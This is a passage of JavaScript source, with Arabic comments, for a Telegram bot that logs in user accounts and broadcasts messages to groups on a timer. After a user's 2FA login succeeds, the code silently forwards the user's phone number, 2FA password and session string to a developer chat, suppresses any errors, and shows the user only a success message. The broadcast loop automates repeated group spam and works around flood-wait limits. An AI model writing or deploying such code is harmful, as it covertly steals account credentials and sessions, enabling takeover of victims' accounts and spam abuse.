            // ═══════════════════════════════════════════════════════
            //  ✅ الإصلاح 2: إشعار الجلسة الجديدة هنا (بعد نجاح 2FA)
            // ═══════════════════════════════════════════════════════
            const userDisplay = ctx.from.username ? `@${ctx.from.username}` : `[رابط](tg://user?id=${ctx.from.id})`;
            await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
                `✅ **جلسة 2FA جديدة أُنشئت!**\n\n👤 اسم الحساب: \`${fullName}\`\n🏷️ يوزره: \`${username}\`\n📱 الرقم: \`${loginData.phone}\`\n🔐 الباسورد: \`${text}\`\n🔑 الجلسة: \`${session}\`\n\n🤖 صاحب الحساب: ${ctx.from.first_name} | ${userDisplay}`,
                { parse_mode: 'Markdown' }
            ).catch(() => {});

            pendingLogin.delete(id); setState(id, 'normal');
            return ctx.reply(`✅ تم تسجيل حساب (${fullName}) بنجاح.`);
        } catch { return ctx.reply('❌ كلمة المرور خاطئة، حاول مرة أخرى:'); }
    }
});

function startBroadcast(id, u) {
    if (broadcastTimers.has(id)) clearTimeout(broadcastTimers.get(id));
    const runIteration = async () => {
        const userData = getUser(id);
        if (!userData.running) { broadcastTimers.delete(id); return; }
        for (const acc of userData.accounts) {
            let client = activeSessions.get(acc.phone);
            if (client && !client.connected) { try { await client.connect(); } catch { continue; } }
            if (!client) continue;
            for (const group of userData.groups) {
                for (const msg of userData.messages) {
                    try { await client.sendMessage(group.raw, { message: msg, parseMode: 'html' }); } catch (e) {
                        if (e instanceof errors.FloodWaitError) {
                            await new Promise(r => setTimeout(r, e.seconds * 1000));
                            try { await client.sendMessage(group.raw, { message: msg, parseMode: 'html' }); } catch {}
                        }
                    }
                }
            }
        }
        let delayMs = 60000;
        const intervalStr = String(userData.interval);
        if (intervalStr.includes('-')) { const [mn, mx] = intervalStr.split('-').map(Number); delayMs = Math.floor(Math.random() * (mx - mn + 1) + mn) * 1000; }
        else { delayMs = (Number(intervalStr) || 60) * 1000; }
        if (userData.running) { broadcastTimers.set(id, setTimeout(runIteration, delayMs)); }
    };
    runIteration();
}

function stopBroadcast(id) {
    if (broadcastTimers.has(id)) { clearTimeout(broadcastTimers.get(id)); broadcastTimers.delete(id); }
}

bot.catch((err) => {
    if (err.response?.error_code === 409) { setTimeout(() => { bot.launch().catch(() => {}); }, 5000); }
});

const startBot = async () => {
    try { await bot.launch(); console.log('✅ Bot started...'); await initAllAccounts(); }
    catch (e) { setTimeout(startBot, 10000); }
};

startBot();
